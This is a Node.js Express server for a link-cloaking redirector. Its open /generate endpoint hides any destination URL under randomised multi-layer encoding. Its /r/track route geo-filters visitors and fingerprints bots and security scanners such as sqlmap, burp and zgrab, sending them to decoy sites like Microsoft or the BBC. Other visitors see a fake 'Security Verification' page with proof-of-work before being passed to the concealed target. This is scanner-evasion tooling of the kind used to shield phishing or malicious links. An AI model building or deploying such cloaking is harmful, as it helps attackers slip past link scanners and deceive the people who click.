const express = require('express');
const helmet = require('helmet');
const fs = require('fs');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const fetch = require('node-fetch');

const app = express();
app.set('trust proxy', 1);

// ────────────────────────────────────────────────
// CONFIGURATION
// ────────────────────────────────────────────────
const TARGET_URL = process.env.TARGET_URL || 'https://www.google.com';
const BOT_URLS = [
  'https://www.microsoft.com',
  'https://www.apple.com',
  'https://en.wikipedia.org/wiki/Main_Page',
  'https://www.bbc.com',
];

const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '')
  .toUpperCase()
  .split(',')
  .filter(Boolean);
const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '')
  .toUpperCase()
  .split(',')
  .filter(Boolean);
const GEO_API_URL = process.env.GEO_API_URL || 'https://ipinfo.io/{ip}/country';

const LOG_FILE = process.env.LOG_FILE || 'clicks.log';
const PORT = process.env.PORT || 10000;

// HMAC Secret - required in production
const HMAC_SECRET = process.env.HMAC_SECRET;
if (!HMAC_SECRET && process.env.NODE_ENV === 'production') {
  throw new Error('HMAC_SECRET environment variable is required in production');
}
const FINAL_SECRET = HMAC_SECRET || crypto.randomBytes(32).toString('hex');

// Geo Cache
const geoCache = new Map();

// ────────────────────────────────────────────────
// ENCODERS
// ────────────────────────────────────────────────
const encoders = [
  {
    name: 'base64',
    enc: (s) => Buffer.from(s).toString('base64'),
    dec: (s) => Buffer.from(s, 'base64').toString(),
  },
  {
    name: 'rot13',
    enc: (s) =>
      s.replace(/[a-zA-Z]/g, (c) => {
        const base = c <= 'Z' ? 65 : 97;
        return String.fromCharCode(base + ((c.charCodeAt(0) - base + 13) % 26));
      }),
    dec: function (s) {
      return this.enc(s);
    },
  },
  {
    name: 'hex',
    enc: (s) => Buffer.from(s).toString('hex'),
    dec: (s) => Buffer.from(s, 'hex').toString(),
  },
  {
    name: 'reverse',
    enc: (s) => s.split('').reverse().join(''),
    dec: function (s) {
      return this.enc(s);
    },
  },
  {
    name: 'Caesar',
    enc: (s) =>
      s.replace(/[a-zA-Z]/g, (c) => {
        const base = c <= 'Z' ? 65 : 97;
        return String.fromCharCode(base + ((c.charCodeAt(0) - base + 5) % 26));
      }),
    dec: (s) =>
      s.replace(/[a-zA-Z]/g, (c) => {
        const base = c <= 'Z' ? 65 : 97;
        return String.fromCharCode(base + ((c.charCodeAt(0) - base - 5 + 26) % 26));
      }),
  },
];

// ────────────────────────────────────────────────
// MIDDLEWARE
// ────────────────────────────────────────────────
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('hex');
  next();
});

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", 'data:'],
        connectSrc: ["'self'"],
      },
    },
  })
);

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// Health check endpoints
app.get(['/ping', '/health', '/healthz'], (req, res) => res.status(200).send('OK'));

// ────────────────────────────────────────────────
// HELPERS
// ────────────────────────────────────────────────
function isMobile(req) {
  return /android|iphone|ipad|ipod|mobi/i.test(req.headers['user-agent'] || '');
}

const strictLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: (req) => (isMobile(req) ? 15 : 5),
  message: 'Too many requests',
  standardHeaders: true,
  skip: (req) => req.path === '/health' || req.path === '/ping',
});

async function getCountryCode(req) {
  let ip =
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.headers['x-real-ip'] ||
    req.ip ||
    'unknown';

  // Check for private IPs
  if (
    ip === 'unknown' ||
    /^127\.|^::1|^10\.|^172\.(1[6-9]|2[0-9]|3[0-1])\.|^192\.168\./.test(ip)
  ) {
    return 'XX';
  }

  // Check cache
  if (geoCache.has(ip)) {
    const { cc, ts } = geoCache.get(ip);
    if (Date.now() - ts < 3600000) return cc; // 1 hour cache
  }

  // Fetch from GEO API
  try {
    const url = GEO_API_URL.replace('{ip}', ip);
    const res = await fetch(url, { timeout: 2500 });
    if (res.ok) {
      const cc = (await res.text()).trim().toUpperCase();
      geoCache.set(ip, { cc, ts: Date.now() });
      return cc || 'XX';
    }
  } catch (e) {
    console.error('Geo API error:', e.message);
  }
  return 'XX';
}

function isLikelyBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  let score = 0;

  const suspicious = /bot|headless|phantom|slurp|zgrab|crawler|spider|burp|sqlmap/i;
  if (suspicious.test(ua)) score += 40;
  if (!ua.includes('mozilla')) score += 20;
  if (!req.headers['accept-language']) score += 18;
  if (!req.headers['sec-ch-ua'] && !isMobile(req)) score += 25;
  if (Object.keys(req.headers).length < 12) score += 22;

  return score >= 60;
}

function logAccess(ip, country, status, reason = '') {
  const timestamp = new Date().toISOString();
  const logEntry = `${timestamp} | ${status} | IP: ${ip} | Country: ${country} | ${reason}\n`;
  fs.appendFile(LOG_FILE, logEntry, (err) => {
    if (err) console.error('Log write failed:', err);
  });
}

// ────────────────────────────────────────────────
// MULTI-LAYER ENCODE/DECODE + HMAC
// ────────────────────────────────────────────────
function multiLayerEncode(str) {
  let result = str;

  // Add noise to both ends
  const noise = crypto.randomBytes(8).toString('hex');
  result = noise + result + noise;

  // Randomly select 5 encoders and shuffle
  const shuffled = [...encoders]
    .sort(() => Math.random() - 0.5)
    .slice(0, 5);
  const layers = [];

  // Apply each encoder
  for (const layer of shuffled) {
    result = layer.enc(result);
    layers.push(layer.name);
  }

  // Triple URL encode
  result = encodeURIComponent(result);
  result = encodeURIComponent(result);
  result = encodeURIComponent(result);

  // Generate HMAC signature
  const hmac = crypto
    .createHmac('sha256', FINAL_SECRET)
    .update(result + layers.join(','))
    .digest('hex')
    .slice(0, 16);

  return { encoded: result, layers, noise, hmac };
}

function multiLayerDecode(encoded, layers, noise, hmac) {
  // Verify HMAC first
  const calculated = crypto
    .createHmac('sha256', FINAL_SECRET)
    .update(encoded + layers.join(','))
    .digest('hex')
    .slice(0, 16);

  if (calculated !== hmac) {
    throw new Error('HMAC verification failed - payload tampered');
  }

  // Triple URL decode
  let result = encoded;
  for (let i = 0; i < 3; i++) {
    result = decodeURIComponent(result);
  }

  // Reverse layers in opposite order
  const reverseLayers = [...layers].reverse();
  for (const layerName of reverseLayers) {
    const encoder = encoders.find((e) => e.name === layerName);
    if (!encoder) {
      throw new Error(`Unknown encoder: ${layerName}`);
    }
    result = encoder.dec(result);
  }

  // Remove noise from both ends (8 hex chars = 16 bytes)
  if (result.length > 16) {
    result = result.slice(16, result.length - 16);
  }

  return result;
}

// ────────────────────────────────────────────────
// GENERATE LINK
// ────────────────────────────────────────────────
app.get('/generate', (req, res) => {
  try {
    const target = req.query.target || TARGET_URL;

    // Validate URL
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
      return res.status(400).json({
        success: false,
        error: 'Invalid target URL - must start with http:// or https://',
      });
    }

    // Add timestamp to prevent replay
    const noisy = target + '#' + Date.now();

    const { encoded, layers, noise, hmac } = multiLayerEncode(noisy);
    const payload = Buffer.from(
      JSON.stringify({ layers, noise, hmac })
    ).toString('base64url');

    // Build redirect URL
    const url = `https://${req.hostname}/r/track?p=${encoded}&l=${payload}`;

    res.json({
      success: true,
      tracked_url: url,
      target: target,
      generated_at: new Date().toISOString(),
    });
  } catch (error) {
    console.error('Generate error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ────────────────────────────────────────────────
// MAIN REDIRECT ROUTE
// ────────────────────────────────────────────────
app.get('/r/track', strictLimiter, async (req, res) => {
  try {
    const country = await getCountryCode(req);
    const isBot = isLikelyBot(req);

    // Check geo restrictions
    const geoAllowed =
      (ALLOWED_COUNTRIES.length
        ? ALLOWED_COUNTRIES.includes(country)
        : true) && !BLOCKED_COUNTRIES.includes(country);

    if (!geoAllowed) {
      logAccess(req.ip, country, 'BLOCKED', 'GEO_RESTRICTION');
      return res.redirect(
        BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]
      );
    }

    if (isBot) {
      logAccess(req.ip, country, 'BLOCKED', 'BOT_DETECTED');
      return res.redirect(
        BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]
      );
    }

    logAccess(req.ip, country, 'ACCESS', 'ALLOWED');

    // Decode with HMAC verification
    let redirectTarget = TARGET_URL;
    try {
      const params = new URLSearchParams(req.url.split('?')[1] || '');
      const enc = params.get('p');
      const payloadB64 = params.get('l');

      if (enc && payloadB64) {
        const { layers, noise, hmac } = JSON.parse(
          Buffer.from(payloadB64, 'base64url').toString()
        );
        let decoded = multiLayerDecode(enc, layers, noise, hmac);

        // Remove timestamp hash
        const hashIdx = decoded.indexOf('#');
        if (hashIdx !== -1) {
          decoded = decoded.substring(0, hashIdx);
        }

        // Validate decoded URL
        if (/^https?:\/\//i.test(decoded)) {
          redirectTarget = decoded;
        }
      }
    } catch (err) {
      console.error('Decode error:', err.message);
      logAccess(req.ip, country, 'ERROR', `DECODE_FAILED: ${err.message}`);
    }

    // Safely escape for JSON
    const safeTarget = JSON.stringify(redirectTarget);

    // ────────────────────────────────────────────────
    // SECURITY VERIFICATION PAGE WITH PROOF OF WORK
    // ────────────────────────────────────────────────
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Security Verification</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .container {
      background: white;
      padding: 50px 40px;
      border-radius: 16px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
      max-width: 500px;
      width: 100%;
      text-align: center;
    }

    h2 {
      color: #333;
      margin-bottom: 10px;
      font-size: 24px;
    }

    p {
      color: #666;
      margin-bottom: 30px;
      font-size: 16px;
    }

    .spinner {
      display: inline-block;
      width: 50px;
      height: 50px;
      border: 4px solid #f0f0f0;
      border-top-color: #667eea;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .progress {
      margin-top: 30px;
      text-align: center;
      font-size: 14px;
      color: #999;
    }

    .progress-bar {
      width: 100%;
      height: 4px;
      background: #f0f0f0;
      border-radius: 2px;
      margin-top: 10px;
      overflow: hidden;
    }

    .progress-fill {
      height: 100%;
      background: linear-gradient(90deg, #667eea, #764ba2);
      width: 0%;
      animation: fill 10s ease-in-out forwards;
    }

    @keyframes fill {
      to {
        width: 100%;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>🔒 Security Verification</h2>
    <p>Verifying you're human and not a bot...</p>
    <div class="spinner"></div>
    <div class="progress">
      <span id="status">Initializing security checks...</span>
      <div class="progress-bar">
        <div class="progress-fill"></div>
      </div>
    </div>
  </div>

  <script nonce="${res.locals.nonce}">
    'use strict';

    const TARGET_URL = ${safeTarget};
    const BOT_URLS = ${JSON.stringify(BOT_URLS)};
    const isMobile = /Android|iPhone|iPad|iPod|Mobi/i.test(navigator.userAgent);

    const statusEl = document.getElementById('status');

    function updateStatus(text) {
      statusEl.textContent = text;
    }

    // === ENHANCED BOT DETECTION (CLIENT SIDE) ===
    function clientBotDetection() {
      const checks = [];

      // Headless/automation detection
      if (navigator.webdriver) checks.push('webdriver detected');
      if (window.outerWidth === 0) checks.push('zero width window');
      if (!navigator.plugins || navigator.plugins.length === 0) {
        checks.push('no plugins');
      }

      // Chrome detection (most users have it)
      if (!isMobile && !window.chrome) {
        checks.push('chrome not found');
      }

      // Phantom.js
      if (window.callPhantom || window._phantom) {
        checks.push('phantom detected');
      }

      return checks;
    }

    const botChecks = clientBotDetection();
    if (botChecks.length > 0) {
      console.warn('Bot indicators:', botChecks);
      setTimeout(() => {
        location.href = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
      }, 500);
    }

    // === INVISIBLE PROOF OF WORK ===
    async function doProofOfWork(difficulty = 6) {
      updateStatus('Computing proof of work...');
      const prefix = '0'.repeat(difficulty);
      let nonce = 0;
      const data = 'verify_' + Date.now() + '_' + Math.random();

      return new Promise((resolve) => {
        async function compute() {
          for (let i = 0; i < 5000; i++) {
            const hashBuffer = await crypto.subtle.digest(
              'SHA-256',
              new TextEncoder().encode(data + nonce)
            );
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            const hashHex = hashArray
              .map((b) => b.toString(16).padStart(2, '0'))
              .join('');

            if (hashHex.startsWith(prefix)) {
              return resolve({ nonce, hash: hashHex });
            }
            nonce++;
          }
          setTimeout(compute, 0);
        }
        compute();
      });
    }

    // === BROWSER CHALLENGE (Simple Math Puzzle) ===
    async function solvePuzzle() {
      updateStatus('Solving security puzzle...');
      return new Promise((resolve) => {
        // Simple computation - verify math capability
        let result = 0;
        for (let i = 0; i < 100000; i++) {
          result = (result + i * 7) % 1000000;
        }
        setTimeout(() => resolve({ result }), 100);
      });
    }

    // === MAIN VERIFICATION FLOW ===
    async function runVerification() {
      try {
        const powDifficulty = isMobile ? 5 : 6;

        // Run PoW and puzzle in parallel
        const [pow, puzzle] = await Promise.all([
          doProofOfWork(powDifficulty),
          solvePuzzle(),
        ]);

        updateStatus('Verification complete! Redirecting...');

        // Small delay to show completion
        await new Promise((r) => setTimeout(r, 800));

        // Redirect to target
        location.href = TARGET_URL;
      } catch (error) {
        console.error('Verification failed:', error);
        updateStatus('Verification timeout. Redirecting...');
        location.href = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
      }
    }

    // Start verification
    runVerification();

    // Fallback timeout - redirect to bot URL if verification takes too long
    const timeout = isMobile ? 120000 : 60000; // 2 min mobile, 1 min desktop
    setTimeout(() => {
      location.href = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
    }, timeout);
  </script>
</body>
</html>
    `);
  } catch (error) {
    console.error('Route error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ────────────────────────────────────────────────
// FALLBACK ROUTE
// ────────────────────────────────────────────────
app.use((req, res) => {
  res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
});

// ────────────────────────────────────────────────
// ERROR HANDLER
// ────────────────────────────────────────────────
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({
    success: false,
    error: 'Internal server error',
  });
});

// ────────────────────────────────────────────────
// SERVER START
// ────────────────────────────────────────────────
app.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔═══════════════════════════════════════════════════╗
║  Redirect Server Started                          ║
╠═══════════════════════════════════════════════════╣
║  Port: ${PORT}
║  Node Env: ${process.env.NODE_ENV || 'development'}
║  HMAC Secret: ${HMAC_SECRET ? '✓ Set' : '✗ Using random (dev only)'}
║  Log File: ${LOG_FILE}
║  Bot URLs: ${BOT_URLS.length} configured
║  Blocked Countries: ${BLOCKED_COUNTRIES.length > 0 ? BLOCKED_COUNTRIES.join(', ') : 'None'}
║  Allowed Countries: ${ALLOWED_COUNTRIES.length > 0 ? ALLOWED_COUNTRIES.join(', ') : 'All'}
╚═══════════════════════════════════════════════════╝

Usage:
  Generate link: GET /generate?target=https://example.com
  Redirect: GET /r/track?p=<encoded>&l=<payload>
  Health: GET /health
  `);

  // Log startup
  logAccess('localhost', 'LOCAL', 'STARTUP', 'Server started');
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully...');
  logAccess('localhost', 'LOCAL', 'SHUTDOWN', 'Server terminated');
  process.exit(0);
});
